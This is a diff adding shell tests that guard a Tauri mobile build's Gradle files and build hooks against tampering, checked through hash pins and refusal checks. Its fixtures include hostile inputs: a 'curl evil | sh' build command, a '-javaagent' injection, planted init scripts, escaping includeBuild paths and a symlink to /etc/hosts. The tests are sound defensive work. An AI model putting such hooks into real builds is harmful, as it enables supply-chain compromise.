@@ -629,7 +629,7 @@ bsrc_tracked() {
   printf 'old callback\n' >"${bt}"
 }
 bsrc_pins() {
-  mobile_pins="mobile_android_buildsrc_pinned() { printf '%s  build.gradle.kts\n%s  ${pkg}/RustPlugin.kt\n' $(shasum -a 256 "${bsrc}/build.gradle.kts" | cut -d' ' -f1) $(shasum -a 256 "${bsrc}/${pkg}/RustPlugin.kt" | cut -d' ' -f1); };"
+  mobile_pins="mobile_android_buildsrc_pinned() { printf '%s  build.gradle.kts\n%s  ${pkg}/RustPlugin.kt\n' $(shasum -a 256 "${bsrc}/build.gradle.kts" | cut -d' ' -f1) $(shasum -a 256 "${bsrc}/${pkg}/RustPlugin.kt" | cut -d' ' -f1); }; mobile_android_gradle_pinned() { :; };"
 }
 bsrc_tracked; bsrc_pins
 expect_pass 'reset removes only the source callback' "${mobile_pins} mobile_build_phase_reset android && [[ ! -e '${bt}' && -f '${bsrc}/build.gradle.kts' && -f '${bsrc}/${pkg}/RustPlugin.kt' ]]"
@@ -666,6 +666,94 @@ expect_fail 'a callback to another npm script' "${mobile_pins} mobile_build_phas
 # The library pins the two tracked private files by hash (hashes only, never content).
 grep -qF '11818be939b3aa44d691228f8666fba5efc796cdc1b4fb8072ab7c91bc056eb0  build.gradle.kts' .github/actions/shell-config/action.yml || fail 'the buildSrc build.gradle.kts hash is not pinned'
 grep -qF 'd9f87ff5a1aaa6c25b2afe8140f1d02fe4f3065ed451a1fef21875d9f30201d9  src/main/java/co/tangent/taurine/mobile/kotlin/RustPlugin.kt' .github/actions/shell-config/action.yml || fail 'the buildSrc RustPlugin.kt hash is not pinned'
+# The rest of gen/android's Gradle build logic: exact set and SHA-256 pin, before and after init.
+aroot="${gen}/android"
+gradle_tracked() {
+  rm -rf "${aroot}"; mkdir -p "${aroot}/app" "${aroot}/gradle/wrapper"
+  printf 'rootProject.name = "x"\n' >"${aroot}/settings.gradle"
+  printf 'plugins { id("root") }\n' >"${aroot}/build.gradle.kts"
+  printf 'plugins { id("app") }\n' >"${aroot}/app/build.gradle.kts"
+  printf 'org.gradle.jvmargs=-Xmx2048m\n' >"${aroot}/gradle.properties"
+  printf 'jar\n' >"${aroot}/gradle/wrapper/gradle-wrapper.jar"; printf 'url\n' >"${aroot}/gradle/wrapper/gradle-wrapper.properties"
+  printf 'sh\n' >"${aroot}/gradlew"; printf 'bat\n' >"${aroot}/gradlew.bat"
+  mkdir -p "${aroot}/buildSrc"; printf 'x\n' >"${aroot}/buildSrc/build.gradle.kts"
+}
+gradle_pins() {
+  local f lines=''
+  for f in app/build.gradle.kts build.gradle.kts gradle.properties settings.gradle; do
+    lines="${lines} '$(shasum -a 256 "${aroot}/${f}" | cut -d' ' -f1)  ${f}'"
+  done
+  gpins="mobile_android_gradle_pinned() { printf '%s\n'${lines}; };"
+}
+gradle_tracked; gradle_pins
+expect_pass 'the pinned Gradle build logic passes before init' "${gpins} mobile_android_gradle_pin_check before-init"
+expect_pass 'the pinned Gradle build logic passes after init' "${gpins} mobile_android_gradle_pin_check after-init"
+printf 'plugins { id("x") }\n' >"${aroot}/app/extra.gradle.kts"
+expect_fail 'an extra .gradle.kts file is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'unexpected file: app/extra.gradle.kts'
+gradle_tracked; printf 'rootProject.name = "evil"\n' >"${aroot}/settings.gradle"
+expect_fail 'a modified settings.gradle is refused' "${gpins} mobile_android_gradle_pin_check after-init" 'settings.gradle: hash mismatch'
+gradle_tracked; printf 'rootProject.name = "x"\ninclude(":evil")\n' >"${aroot}/settings.gradle.kts"
+expect_fail 'a second settings file (settings.gradle.kts) is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'unexpected file: settings.gradle.kts'
+gradle_tracked; gradle_pins; printf 'org.gradle.jvmargs=-javaagent:/tmp/evil.jar\n' >"${aroot}/gradle.properties"
+expect_fail 'gradle.properties with a changed org.gradle.jvmargs is refused' "${gpins} mobile_android_gradle_pin_check after-init" 'gradle.properties: hash mismatch'
+gradle_tracked; gradle_pins; printf 'allprojects { }\n' >"${aroot}/init.gradle"
+expect_fail 'a planted init.gradle is refused' "${gpins} mobile_android_gradle_pin_check after-init" 'unexpected file: init.gradle'
+rm "${aroot}/init.gradle"; mkdir -p "${aroot}/app/init.d"; : >"${aroot}/app/init.d/a.txt"
+expect_fail 'a planted init.d directory is refused' "${gpins} mobile_android_gradle_pin_check after-init" 'init.d directory'
+gradle_tracked; printf '[versions]\n' >"${aroot}/gradle/libs.versions.toml"
+expect_fail 'a version catalog is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'unexpected file: gradle/libs.versions.toml'
+gradle_tracked; printf 'apply from: "x"\n' >"${aroot}/gradle/extra.gradle"
+expect_fail 'a gradle/*.gradle script is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'unexpected file: gradle/extra.gradle'
+gradle_tracked; gradle_pins; rm "${aroot}/gradle.properties"
+expect_fail 'a missing pinned file is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'missing file: gradle.properties'
+gradle_tracked; gradle_pins; ln -s /etc/hosts "${aroot}/gradle/link"
+expect_fail 'a symlink under gen/android is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'link or special file'
+gradle_tracked; gradle_pins; printf 'x\n' >"${aroot}/tauri.settings.gradle"
+expect_fail 'a generated tauri.settings.gradle is refused before init' "${gpins} mobile_android_gradle_pin_check before-init" 'unexpected file: tauri.settings.gradle'
+expect_pass 'the CLI-generated tauri.settings.gradle is allowed after init' "${gpins} mobile_android_gradle_pin_check after-init"
+printf 'x\n' >"${aroot}/app/tauri.build.gradle.kts"
+expect_pass 'the CLI-generated tauri.build.gradle.kts is allowed after init' "${gpins} mobile_android_gradle_pin_check after-init"
+bsp="mobile_android_buildsrc_pinned() { printf '%s  build.gradle.kts\n' $(shasum -a 256 "${aroot}/buildSrc/build.gradle.kts" | cut -d' ' -f1); };"
+expect_pass 'reset removes the generated gradle files, then passes' "${bsp} ${gpins} mobile_build_phase_reset android && [[ ! -e '${aroot}/tauri.settings.gradle' && ! -e '${aroot}/app/tauri.build.gradle.kts' ]]"
+# The include path guard: an included build that leaves gen/android (checked on a re-pinned file).
+gradle_tracked; printf 'includeBuild("../evil")\n' >"${aroot}/settings.gradle"; gradle_pins
+expect_fail 'an includeBuild outside gen/android is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'included build leaves gen/android'
+gradle_tracked; printf 'includeBuild("/tmp/evil")\n' >"${aroot}/settings.gradle"; gradle_pins
+expect_fail 'an absolute includeBuild is refused' "${gpins} mobile_android_gradle_pin_check before-init" 'included build leaves gen/android'
+# The four real pins are in the library and the checks run before the builds.
+for h in 780ee423777541b6d7a4f75d7d8da188dc1a92860f70fea09015b03d2e1594c2 f8d6b8ac33de9acbe318595de7be4500fec1009f8ea0edc508fd998cc15294c5 580de86208e48edae2206e167da024f17794269d296ad46a94d001c6809ba2cb 99856053f245337d20d308dbeaf9cd7250ad0c186ebbb6866ab46a6e7005ee19; do
+  grep -qF "'${h}  " .github/actions/shell-config/action.yml || fail "a Gradle build-logic hash is not pinned (${h:0:8})"
+done
+grep -qF 'mobile_android_gradle_pin_check after-init || exit 1' .github/workflows/android-validation.yml || fail 'android-native does not re-check the Gradle build logic before the build'
+
+# Build hooks: the frontend hook is exactly `npm run build`; no bundle hook; no other config file.
+hsrc="${src}/taurine-mobile/src-tauri"
+hooks_tracked() {
+  rm -f "${hsrc}"/tauri.*.conf.json "${hsrc}/Tauri.toml"
+  printf '{"build":{"beforeBuildCommand":"npm run build","beforeDevCommand":"npm run dev"}}\n' >"${hsrc}/tauri.conf.json"
+  printf '{"scripts":{"build":"tsc && vite build","tauri":"tauri"}}\n' >"${src}/taurine-mobile/package.json"
+}
+hooks_tracked
+expect_pass 'the current build hook passes' 'mobile_tauri_hooks_check'
+printf '{"build":{"beforeBuildCommand":"curl evil | sh"}}\n' >"${hsrc}/tauri.conf.json"
+expect_fail 'a different beforeBuildCommand is refused' 'mobile_tauri_hooks_check' 'beforeBuildCommand is not exactly'
+printf '{"build":{"beforeBuildCommand":"npm run build && sh x.sh"}}\n' >"${hsrc}/tauri.conf.json"
+expect_fail 'a chained beforeBuildCommand is refused' 'mobile_tauri_hooks_check' 'beforeBuildCommand is not exactly'
+printf '{"build":{"beforeBuildCommand":{"script":"npm run build","cwd":"/tmp"}}}\n' >"${hsrc}/tauri.conf.json"
+expect_fail 'an object-form beforeBuildCommand is refused' 'mobile_tauri_hooks_check' 'beforeBuildCommand is not exactly'
+printf '{"build":{}}\n' >"${hsrc}/tauri.conf.json"
+expect_fail 'a missing beforeBuildCommand is refused' 'mobile_tauri_hooks_check' 'beforeBuildCommand is not exactly'
+printf '{"build":{"beforeBuildCommand":"npm run build","beforeBundleCommand":"sh x.sh"}}\n' >"${hsrc}/tauri.conf.json"
+expect_fail 'a non-empty beforeBundleCommand is refused' 'mobile_tauri_hooks_check' 'beforeBundleCommand is set'
+hooks_tracked; printf '{"build":{"beforeBuildCommand":"sh x.sh"}}\n' >"${hsrc}/tauri.android.conf.json"
+expect_fail 'a platform config merged by the CLI is refused' 'mobile_tauri_hooks_check' 'extra Tauri config file: tauri.android.conf.json'
+rm "${hsrc}/tauri.android.conf.json"; printf '[build]\n' >"${hsrc}/Tauri.toml"
+expect_fail 'a Tauri.toml is refused' 'mobile_tauri_hooks_check' 'extra Tauri config file: Tauri.toml'
+hooks_tracked; printf '{"scripts":{"build":"tsc","postbuild":"sh x.sh"}}\n' >"${src}/taurine-mobile/package.json"
+expect_fail 'a postbuild script behind npm run build is refused' 'mobile_tauri_hooks_check' 'prebuild/postbuild'
+rm -f "${hsrc}/Tauri.toml" "${src}/taurine-mobile/package.json"; printf '{"build":{}}\n' >"${hsrc}/tauri.conf.json"
+grep -qF 'mobile_tauri_hooks_check || exit 1' .github/workflows/android-validation.yml || fail 'android-native does not check the build hooks'
+grep -qF 'mobile_tauri_hooks_check || exit 1' .github/workflows/ios-validation.yml || fail 'ios-native does not check the build hooks'
 yml="${gen}/apple/project.yml"
 lsp='$(inherited) $(PROJECT_DIR)/Externals/arm64/$(CONFIGURATION) $(SDKROOT)/usr/lib/swift $(DEVELOPER_DIR)/Toolchains/XcodeDefault.xctoolchain/usr/lib/swift/$(PLATFORM_NAME) $(DEVELOPER_DIR)/Toolchains/XcodeDefault.xctoolchain/usr/lib/swift-5.0/$(PLATFORM_NAME)'
 project_yml() {
